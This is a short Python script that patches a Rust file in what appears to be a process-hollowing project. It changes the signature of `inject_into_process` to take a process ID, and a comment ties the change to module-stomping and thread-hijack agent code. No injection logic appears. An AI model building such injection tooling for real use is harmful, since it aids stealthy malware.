import os
import re
hollowing = '/home/replicant/la/hollowing/src/windows_impl.rs'

with open(hollowing, 'r') as f:
    text = f.read()

# Fix inject_into_process signature expected by agent module stomp and thread hijack
text = text.replace('pub fn inject_into_process(process: *mut c_void, payload: &[u8]) -> Result<()> {', 'pub fn inject_into_process(pid: u32, payload: &[u8]) -> Result<()> {')
with open(hollowing, 'w') as f:
    f.write(text)

